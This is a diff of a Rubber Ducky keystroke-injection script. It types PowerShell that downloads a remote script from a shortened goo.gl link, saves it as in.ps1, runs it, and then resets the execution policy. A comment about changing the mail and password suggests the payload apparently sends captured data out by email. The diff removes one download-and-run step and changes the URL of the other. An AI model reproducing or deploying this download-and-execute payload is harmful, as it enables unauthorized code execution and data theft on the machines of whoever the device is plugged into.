@@ -21,12 +21,6 @@ DELAY 200
 STRING a
 ENTER
 DELAY 500
-REM 		-- The link https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/5d034259e4487fa4d5767882e326a0dcdc421bf4/just%2520for%2520my%2520own%2520testing
-STRING (new-object net.webclient).DownloadFile('https://goo.gl/EqRMJV','in.ps1')
-SHIFT ENTER
-STRING ./in.ps1
-ENTER
-DELAY 2000
 
 REM 		-- Remember to change mail and password
 
@@ -38,12 +32,12 @@ ENTER
 DELAY 300
 
 
-REM 		-- https://gist.githubusercontent.com/MrSnowMonster/4477191a915b3e9deb8b911803858dd4/raw/d61abbb972cfd11497781f69a7ba076125ff31ce/gistfile1.txt
-STRING (new-object net.webclient).DownloadFile('https://goo.gl/IuEZ6k','an.ps1')
+REM 		-- https://gist.githubusercontent.com/MrSnowMonster/67b473f0395f6c08b7418680de668e1f/raw/80a29658ede19cfc692f384453fe63993fbe0141/just%2520for%2520my%2520own%2520testing.txt
+STRING (new-object net.webclient).DownloadFile('https://goo.gl/hGG54O','in.ps1')
 SHIFT ENTER
-STRING ./an.ps1
+STRING ./in.ps1
 ENTER
-DELAY 2000
+DELAY 4000
 ENTER
 STRING Set-ExecutionPolicy restricted
 ENTER
